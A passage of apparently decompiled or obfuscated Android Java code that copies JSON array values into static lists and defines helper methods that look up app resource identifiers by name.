                            WD.WD_CENTER.jjssArrays.add((String) jsonArray.get(i));
                        }
                    }

                    if (jSONObject.has("dev_array")) {
                        WD.WD_CENTER.deArray.clear();
                        JSONArray jsonArray = jSONObject.getJSONArray("dev_array");
                        for (int i = 0; i < jsonArray.length(); i++) {
                            WD.WD_CENTER.deArray.add((String) jsonArray.get(i));
                        }
                    }

                    a.sendMsg(000, "");

                    return true;
                }

                lu(str);

            } catch (Exception unused) {
            }
            return true;
        }
    }


    public static int gli(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString, "layout",
                paramContext.getPackageName());
    }

    public static int gsi(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString, "string",
                paramContext.getPackageName());
    }

    public static int gdi(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "drawable", paramContext.getPackageName());
    }

    public static int gmip(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "mipmap", paramContext.getPackageName());
    }

    public static int gssiop(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "style", paramContext.getPackageName());
    }

    public static int ggi(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString, "id", paramContext.getPackageName());
    }

    public static int gcii(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "color", paramContext.getPackageName());
    }

    public static int gai(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "array", paramContext.getPackageName());
    }

}
